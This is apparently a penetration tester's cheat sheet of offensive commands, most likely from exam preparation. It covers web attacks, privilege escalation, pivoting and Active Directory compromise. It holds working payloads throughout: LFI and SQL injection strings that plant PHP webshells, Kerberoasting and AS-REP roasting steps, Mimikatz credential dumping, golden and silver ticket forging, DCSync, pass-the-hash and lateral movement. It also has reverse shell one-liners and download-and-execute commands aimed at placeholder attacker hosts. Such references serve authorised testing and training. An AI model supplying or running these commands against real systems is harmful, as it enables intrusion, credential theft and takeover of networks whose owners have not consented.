	FTP
		anonymous
		hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <IP> ftp
	
	Web attacks:
		XSS
		DirTraversal:
			C:\Windows\System32\drivers\etc\hosts
			C:\inetpub\wwwroot\web.config
			C:\inetpub\logs\LogFiles\W3SVC1\
			%2e%2e%2f
		LFI:
			<?php echo system($_GET['cmd']); ?>
			log file poisoning (UA)
			ls%20-la
			
			?page=php://filter/resource=asd.php
			?page=php://filter/convert.base64-encode/resource=asd.php
			?page=data://text/plain,<?php%20echo%20system('whoami');?>"
			?page=data://text/plain;base64,<base64 encoded PHP snippet>&cmd=whoami"
		RFI
		Upload:
			XXE
			XSS
			overwrite with dirtrav in filename
		Command injection
			cmd or ps: (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
		SQL
			' or 1=1 in (select @@version) -- //
			' union select version(),null -- 
			EXECUTE sp_configure 'show advanced options', 1;
			RECONFIGURE;
			EXECUTE sp_configure 'xp_cmdshell', 1;
			RECONFIGURE;
			EXECUTE xp_cmdshell 'whoami';
			' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
			
			
	
	PrivEsc Information Gathering:
		Username and hostname
		Group memberships of the current user
		Existing users and groups
		Operating system, version and architecture
		Network information
		Installed applications
		Running processes
	
		Windows:
			whoami
			whoami /groups
			systeminfo
			ipconfig /all
			route print
			netstat -ano
			net user <user>
	
			Get-LocalUser
			Get-LocalGroup
			Get-LocalGroupMember <groupname>
			Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
			Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
			Get-Process
			Get-ChildItem -Path C:\ -Include *.kdbx *.txt, *.ini, *.pdf,*.xls,*.xlsx,*.doc,*.docx  -File -Recurse -ErrorAction SilentlyContinue
			Get-History
			(Get-PSReadlineOption).HistorySavePath
	
		Linux:
			id
			hostname
			/etc/issue
			/etc/*-release
			uname -a 
			ps aux
			ifconfig/ip a
			route/routel
			netstat -anp
			/etc/iptables 
			/etc/cron.* 
			/etc/crontab 
			crontab -l
			dpkg -l
			find / -writable -type d 2>/dev/null
			/etc/fstab
			mount
			lsblk
			lsmod
			/sbin/modinfo <module name>
			find / -perm -u=s -type f 2>/dev/null
	
	
	ssh -L 0.0.0.0:<PORT TO>:<REMOTE IP>:<PORT FROM> <username>@<LOCAL IP>
	ssh -D 0.0.0.0:<PROXYCHAINS PORT> <username>@<LOCAL IP>
	ssh -N -R 127.0.0.1:<PORT TO>:<LOCAL IP>:<LOCAL PORT> <ME>@<MY IP>
	ssh -N -R <PROXYCHAINS PORT> <ME>@<MY IP>
	
	sshuttle, dnscat2, chisel
	Windows: ssh,plink,netsh
	netsh interface portproxy add v4tov4 listenport=<MY PORT> listenaddress=<MY IP> connectport=<REMOTE PORT> connectaddress=<REMOTE IP>
	netsh advfirewall firewall add rule name="port_forward_ssh_<MY PORT>" protocol=TCP dir=in localip=<MY IP> localport=<MY PORT> action=allow
	netsh advfirewall firewall delete rule name="port_forward_ssh_<MY PORT>"
	netsh interface portproxy del v4tov4 listenport=<MY PORT> listenaddress=<MY IP>
	
	proxychains config: socks5 <IP> <PORT>
	tcp_read_time_out and tcp_connect_time_out reducing for faster portscan
	
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	
	Privesc:
		Windows:
			Binary Hijacking (services):
				Get-Service 000
				Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
				Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | Where-Object {$_.PathName -notlike 'C:\Windows\*'}
				icacls <fullpathofexe> 
				Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<nameoftheservice>'}
				Restart-Service <servicename>
				shutdown /r /t 0 
	
			DLL Injection 
				Procmon: filter to the service and find name not found
	
			Unquoted paths:
				wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """   
	
			Scheduled:
				schtasks /query /fo LIST /v
				schtasks /query /fo LIST |  findstr /i /v "C:\Windows\\" | findstr /i /v "\Microsoft\\" | findstr /i "Task To Run:" 
				
			Exploits
				https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 
				https://github.com/BeichenDream/GodPotato
	
		Linux:
			unix-privesc-check
			.bashrc
			env
			crunch 6 char
			watch -n 1 "ps -aux | grep pass"
			sudo tcpdump -i lo -A | grep "pass"
			grep "CRON" /var/log/syslog
	
			openssl passwd <password>
			setuid
	
			/usr/sbin/getcap -r / 2>/dev/null
			gtfobins
			kernel exploits 
	
	Domain:
		Information Gathering:
	
			net user /domain
			net user <username> /domain
			net group /domain
			net group <groupname> /domain
	
			powerview: Import-Module .\PowerView.ps1
				Get-NetDomain
				Get-NetUser
				Get-NetUser | select cn,pwdlastset,lastlogon
				Get-NetGroup | select cn
				Get-NetGroup "<GroupName>" | select member
				Get-NetComputer
				Get-NetComputer | select operatingsystem,dnshostname
				Find-LocalAdminAccess
				Get-NetSession -ComputerName <ComputerName> -Verbose
				Get-NetUser -SPN | select samaccountname,serviceprincipalname
				Get-ObjectAcl -Identity <username>
				Convert-SidToName <SID>
				ActiveDirectoryRights and SecurityIdentifier are the interesting ACLs
				Get-ObjectAcl -Identity "<GroupName>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
				Get-NetGroup "Management Department" | select member
				Find-DomainShare (-CheckShareAccess)
	
		
			gpp-decrypt "password" (decrypt local workstation passwords on kali)
			setspn -L <username>
			Get-NetUser -SPN | select samaccountname,serviceprincipalname
			SharpHound: Invoke-BloodHound -CollectionMethod All -OutputDirectory <Folder> -OutputPrefix "<something>"
			net accounts
	
		Exploitation:
			kerbrute
			
			NTLMrelay:
				ntlmrelayx.py -smb2support -t smb//<IP>
	
			Mimikatz:
				crypto::capi
				crypto::cng
			powershell -ep bypass
	
			AS-REP Roasting: impacket-GetNPUsers or Rubeus
				GetNPUsers -dc-ip <IP>  -request -outputfile hashes.asreproast <domain/username>
				or Get-DomainUser -PreauthNotRequired (PowerView) 
				hashcat --help | grep -i "Kerberos"
				sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
				.\Rubeus.exe asreproast /nowrap
				Targeted AS-REP Roasting
			Kerberoasting:
				Rubeus.exe kerberoast /outfile:hashes.kerberoast
				GetUserSPNs -request -dc-ip <IP> <domain/username>
				Invoke-Kerberoast.ps1 (import module and: Invoke-Kerberoast -OutputFormat Hashcat)
			Silver ticket: kerberos::golden /sid:<SID> /domain:<DOMAIN> /ptt /target:web01.domain.local /service:http /rc4:<RC4HASH> /user:<USERNAME>
				SPN password hash: sekurlsa::logonpasswords
				Domain SID of the user: whoami /user
				Target SPN: e.g.:HTTP/web01.domain.local:80
			DCSync:
				lsadump::dcsync /user:<DOMAIN\TARGETUSER>
				impacket-secretsdump -just-dc-user <TARGETUSER> <DOMAIN/USER>:"<PASSWORD>"@<DCIP>
	
			WMIC:
				wmic /node:<IP> /user:<USER> /password:<PASSWORD> process call create "<PROCESS>"
				With Powershell:
					$username = '<USER>';
					$password = '<PASSWORD>';
					$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
					$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
					$options = New-CimSessionOption -Protocol DCOM
					$session = New-Cimsession -ComputerName <IP> -Credential $credential -SessionOption $Options 
					$command = '<PROCESS>';
					Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
			WinRM:
				winrs -r:<HOST> -u:<USER> -p:<PASSWORD> "<COMMAND>"
				With Powershell:
					$username = '<USER>';
					$password = '<Password>';
					$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
					$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
					New-PSSession -ComputerName <IP> -Credential $credential
					
					Enter-PSSession <ID>
			PsExec:
				PsExec64.exe -i  \\<HOST> -u <DOMAIN\USER> -p <PASSWORD> <COMMAND>
			PtH:
				impacket-wmiexec -hashes :<NTLMHASH> <USERNAME>@<HOST>
			Overpass the Hash
				sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell
			PtT:
				sekurlsa::tickets /export
				kerberos::ptt <*.kirbi>
			DCOM:
				$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<TARGETIP>"))
				$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"/c <powersshell -nop -w hidden -e <REVSHELL>>","7")
			GoldenTicket:
				kerberos::golden /user:<OurUser> /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLMHASHofkrbtg> /ptt
			ShadowCopy:
				vshadow.exe -nw -p  C:
				copy <Shadow copy device name> C:\ntds.dit.bak
				reg.exe save hklm\system c:\system.bak
				impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL (on kali)
	
	Misc:
		Files:
			certutil.exe -urlcache -split -f <PathToFile>
			from: nc -w 3 <IP PORT> < <FILE> to: nc -l -p <PORT> > <FILE>
			Authenticating with the user's credentials: iwr -UseDefaultCredentials <URL>
			Invoke-WebRequest -Uri "<URL>" -OutFile <FilePath>
	
		Shells:
			bash -i >& /dev/tcp/IP/PORT 0>&1
			bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"
			rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP PORT> >/tmp/f
			python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP>\",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
		Random:
			klist
	
			kerberos::purge
			misc::cmd 
	
	
			IEX (New-Object System.Net.Webclient).DownloadString("<URL>");powercat -c <IP> -p <PORT> -e <COMMAND> 
	
			smbserver.py -smb2support myshare /Respondershare
			runas /user:<username> cmd
			Invoke-RunasCs -Username <USERNAME> -Password <PASSW> -Command "whoami" (after import)
	
			WPAD: responder -I tun0 -wv
	
			ldapsearch -v -x -b "DC=<HOSTNAME>,DC=<DOMAIN>" -H "ldap://<IP>" "(objectclass=*)"
	
			hashgrab.py
			ntlm_theft.py
	
			https://guif.re/windowseop
			https://github.com/expl0itabl3/Toolies
			https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1
			https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
			https://github.com/itm4n/PrivescCheck
